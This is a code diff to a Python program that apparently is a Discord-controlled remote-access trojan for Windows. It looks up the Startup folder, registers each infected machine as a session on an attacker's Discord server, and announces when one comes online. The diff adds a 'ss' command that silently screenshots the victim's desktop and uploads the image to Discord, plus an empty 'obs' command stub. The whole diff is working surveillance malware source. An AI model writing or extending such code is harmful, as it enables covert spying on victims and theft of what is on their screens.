@@ -6,6 +6,7 @@ import string
 import random
 import tempfile
 import winreg
+import pyautogui
 
 # Load environment variables
 load_dotenv()
@@ -29,7 +30,7 @@ def get_startup_folder():
     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key) as reg_key:
         return winreg.QueryValueEx(reg_key, 'Startup')[0]
 
-def create_session_name(length=SESSION_NAME_LEN):
+def random_ascii(length=SESSION_NAME_LEN):
     """Generate a random session name."""
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(length)).upper()
 
@@ -78,6 +79,10 @@ async def prep_for_discord(guild, channel_names, prefix_for_marking, delete_old_
                             await channel.delete()
                     await cat.delete()
 
+TEMP_DIR = tempfile.gettempdir()
+session_name = random_ascii()
+existing_session_name = exists(TEMP_DIR)
+
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user}!')
@@ -86,11 +91,6 @@ async def on_ready():
     if not guild:
         print(f"Guild with ID {SERVER_ID} not found.")
         return
-
-    temp_dir = tempfile.gettempdir()
-    session_name = create_session_name()
-    existing_session_name = exists(temp_dir)
-
     if existing_session_name:
         session_name = existing_session_name
         print(f"Session already exists: {session_name}")
@@ -102,7 +102,7 @@ async def on_ready():
                     break
     else:
         print("Creating new session...")
-        make_temp_dir(session_name, temp_dir)
+        make_temp_dir(session_name, TEMP_DIR)
         await prep_for_discord(guild, CHANNEL_NAMES, PREFIX_FOR_MARKING, DELETE_OLD_CHANNELS, session_name)
         category = discord.utils.get(guild.categories, name=PREFIX_FOR_MARKING + session_name)
         if category:
@@ -110,5 +110,20 @@ async def on_ready():
                 if channel.name in CHANNEL_NAMES:
                     await channel.send("@everyone online!")
                     break
+@bot.command(name='ss')
+async def screenshot(ctx):
+    try:
+        screenshot = pyautogui.screenshot()
+        name = random_ascii(5)
+        screenshot.save(os.path.join(TEMP_DIR,name))
+        with open(os.path.join(TEMP_DIR,name), 'rb') as f:
+            await ctx.send(file=discord.File(f, 'Screenshot.png'))
+    except Exception as e:
+        await ctx.send(f"Error has occuried {e}")
+        
+@bot.command(name='obs')
+async def obs(ctx, seconds):
+    pass
+
 
 bot.run(TOKEN)
